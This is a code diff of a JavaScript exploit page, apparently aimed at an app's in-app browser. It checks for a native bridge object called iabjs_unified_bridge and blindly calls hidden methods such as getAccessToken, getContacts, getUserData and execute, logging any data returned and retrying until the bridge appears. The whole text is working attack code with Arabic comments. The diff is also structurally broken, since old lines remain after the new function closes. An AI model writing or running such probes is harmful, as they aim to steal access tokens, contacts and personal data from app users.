@@ -24,22 +24,41 @@
             console.log(msg);
         }
 
-        function startExploit() {
-            log("Checking for bridge injection...");
+       function startExploit() {
+    log("Checking for bridge injection...");
 
-            if (window.iabjs_unified_bridge) {
-                status.innerHTML = "<span class='success'>BRIDGE ACTIVE</span>";
-                log("[+] FOUND: iabjs_unified_bridge");
+    if (window.iabjs_unified_bridge) {
+        status.innerHTML = "<span class='success'>BRIDGE ACTIVE</span>";
+        log("[+] FOUND: iabjs_unified_bridge");
 
-                // --- مكان وضع الدوال الجديد ---
-                const secretMethods = [
-                    'getAccessToken', 
-                    'getContacts', 
-                    'getUserData', 
-                    'sendIntent', 
-                    'launchCaspian',
-                    'execute'
-                ];
+        const secretMethods = [
+            'getAccessToken', 
+            'getContacts', 
+            'getUserData', 
+            'sendIntent', 
+            'execute'
+        ];
+
+        log("Attempting Blind Call for hidden methods...");
+
+        secretMethods.forEach(function(method) {
+            // محاولة الاستدعاء حتى لو لم تكن الدالة مرئية في الفحص
+            try {
+                log("Testing: " + method + "...");
+                
+                window.iabjs_unified_bridge[method](function(result) {
+                    log("<span class='danger'>🚨 SUCCESS! Data from " + method + ": </span>" + JSON.stringify(result));
+                });
+            } catch(e) { 
+                log("[-] Method " + method + " failed or requires different arguments."); 
+            }
+        });
+
+    } else {
+        log("[-] Bridge not found. Retrying...");
+        setTimeout(startExploit, 1000);
+    }
+}
 
                 log("Attempting to brute-force hidden methods...");
 
